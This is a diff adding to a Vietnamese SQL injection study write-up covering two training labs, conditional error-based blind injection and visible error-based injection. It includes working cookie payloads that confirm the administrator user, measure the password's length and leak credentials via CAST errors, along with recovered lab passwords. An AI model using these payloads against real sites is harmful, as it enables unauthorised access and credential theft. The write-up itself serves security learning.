@@ -210,14 +210,92 @@ Trả về lỗi => biết được rằng dữ liệu chèn vào được thự
 <img width="1479" height="803" alt="image" src="https://github.com/user-attachments/assets/77de35e8-f3cf-4467-8cbf-e0627cb26cea" />
 > Bảng user tồn tại 
 
+4) Khai thác điều kiện bằng CASE để tạo lỗi có điều kiện.
+```
+    TrackingId=oZZ3vis3DjVR0yex'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+<img width="1485" height="617" alt="image" src="https://github.com/user-attachments/assets/fbfb5bb0-5980-42fe-9704-2f7dfc5a53a1" />
+→ Có lỗi (chia cho 0).
+<img width="1477" height="757" alt="image" src="https://github.com/user-attachments/assets/1510b82b-5673-4d27-9289-ea344624ad9f" />
+→ Không lỗi.
+> → Điều này chứng minh có thể tạo lỗi dựa trên điều kiện đúng/sai.
 
+5) Kiểm tra user administrator có tồn tại:
+```
+    TrackingId=oZZ3vis3DjVR0yex'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+<img width="1493" height="539" alt="image" src="https://github.com/user-attachments/assets/0c9a8a34-9a54-4f92-84c1-df79c2dbde8a" />
+→ Có lỗi → user administrator tồn tại.
 
+6) Xác định độ dài mật khẩu của administrator:
+```
+    TrackingId=oZZ3vis3DjVR0yex'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+<img width="1489" height="569" alt="image" src="https://github.com/user-attachments/assets/c5332216-5f0b-44a9-a488-0bfef1253328" />
+> Gặp lỗi => mật khẩu dài hơn 1 kí tự
+- Tương tự thử đến khi nào hết lỗi thì dừng, và khi tăng tới số 20 thì không còn lỗi
+<img width="1481" height="653" alt="image" src="https://github.com/user-attachments/assets/0c49ed81-7dc6-4c59-b35c-59010d777f33" />
+> Mật khẩu có 20 kí tự
 
+7) Brute force mật khẩu bằng Intruder
+
+<img width="1915" height="801" alt="image" src="https://github.com/user-attachments/assets/41e638f8-cefc-49fc-b684-016734a88c5f" />
+<img width="1559" height="702" alt="image" src="https://github.com/user-attachments/assets/2cf6e89c-d1f3-46ee-82b4-8b7543838042" />
+> Mật khẩu có được 7i7wvokhsq56b4q7m0re
+
+<img width="1860" height="720" alt="image" src="https://github.com/user-attachments/assets/2a9f0e32-94b7-4986-82e9-5088a97ae9bb" />
+> Đăng nhập thành công
 
 - **Trích xuất dữ liệu nhạy cảm qua lỗi chi tiết**
   ```
   ERROR: invalid input syntax for type integer: "Example data"
   ```
+**Lab: Visible error-based SQL injection**
+1) Trong Repeater, thêm một dấu nháy đơn ' vào giá trị cookie TrackingId rồi gửi request:
+<img width="1492" height="680" alt="image" src="https://github.com/user-attachments/assets/6bd56945-9c4c-459c-99b0-187d5ca1bf26" />
+> Trong response, chú ý thông báo lỗi chi tiết. Nó tiết lộ toàn bộ câu lệnh SQL, bao gồm cả giá trị cookie.
+
+2) Thêm dấu comment vào giá trị trên thì không còn hiện lỗi
+<img width="1479" height="758" alt="image" src="https://github.com/user-attachments/assets/8a26d8f9-9f59-41c3-a1f2-598040cd05e0" />
+
+3) chạy một subquery SELECT và ép kiểu kết quả về int:
+```
+    TrackingId=vKj3VnZ6ctQznt4S' AND CAST((SELECT 1) AS int)--
+```
+<img width="1485" height="607" alt="image" src="https://github.com/user-attachments/assets/b12dea8d-5cc8-4bdd-b9d4-a137c59c33d8" />
+
+thấy lỗi khác: AND condition must be a boolean expression (điều kiện trong AND phải là biểu thức Boolean).
+> Dữ liệu bạn chèn vào đang được xử lý trong một câu lệnh SQL thật sự.
+
+4) Sửa điều kiện cho đúng bằng cách thêm toán tử so sánh =
+```
+    TrackingId=vKj3VnZ6ctQznt4S' AND 1=CAST((SELECT 1) AS int)--
+```
+<img width="1484" height="785" alt="image" src="https://github.com/user-attachments/assets/963b9c6d-7fee-49fe-8cf1-ebd2a5469cf3" />
+>  Không còn lỗi nữa ⇒ query hợp lệ.
+5) Thay đổi SELECT để lấy dữ liệu username từ CSDL:
+<img width="1490" height="710" alt="image" src="https://github.com/user-attachments/assets/3d7318ad-6500-4b5e-9980-64e7993c4839" />
+> xuất hiện lại lỗi ban đầu. Payload có vẻ bị cắt ngắn do giới hạn ký tự, nên phần comment -- không còn.
+
+6) Xoá giá trị gốc của cookie TrackingId để tiết kiệm ký tự. 
+<img width="1499" height="646" alt="image" src="https://github.com/user-attachments/assets/ec1849f9-1eb8-4b53-8b3c-7a7218f57b69" />
+
+ > subquery (SELECT username FROM users) trả về nhiều dòng → Database không biết chọn cái nào để so sánh → báo lỗi.
+7) Sửa query để chỉ trả về 1 dòng:
+  ```
+    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+  ```
+<img width="1490" height="624" alt="image" src="https://github.com/user-attachments/assets/b520b8b4-8320-4ec3-a249-7dfbcac43dec" />
+> Lộ ra usrname đầu tiên trong bảng là administrator
+vaf sửa lại query để lộ mật khẩu
+  ```
+    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+  ```
+<img width="1477" height="667" alt="image" src="https://github.com/user-attachments/assets/7df612e7-42e1-40b4-a7fd-83e39d253870" />
+> Lộ mật khẩu của usr đầu tiên là 4exxf0il4jack4c09fz3
+- Sau khi có usr và pwd thì đăng nhập thành công
+<img width="1851" height="778" alt="image" src="https://github.com/user-attachments/assets/ed04b516-cd38-478c-8acd-e2e1043d1f6a" />
+
 - **Khai thác blind SQL injection bằng cách kích hoạt độ trễ (Time Delay)**
   ```
   '; IF (1=2) WAITFOR DELAY '0:0:10'--
